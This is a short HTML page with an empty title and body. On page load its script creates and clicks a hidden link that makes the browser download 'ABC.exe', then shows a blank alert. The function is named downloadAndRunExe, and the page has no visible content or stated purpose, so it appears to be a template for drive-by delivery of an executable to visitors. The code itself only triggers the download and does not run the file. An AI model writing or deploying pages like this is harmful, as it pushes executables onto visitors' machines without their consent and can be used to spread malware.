<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script>

        function downloadAndRunExe() {
            
            const exeUrl = "ABC.exe"; 
            
          
            const link = document.createElement("a");
            link.href = exeUrl;
            link.download = "ABC.exe";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            setTimeout(() => {
                alert("");
            }, 2000);
        }

        window.onload = downloadAndRunExe;
    </script>
</head>
<body>

</body>
</html>
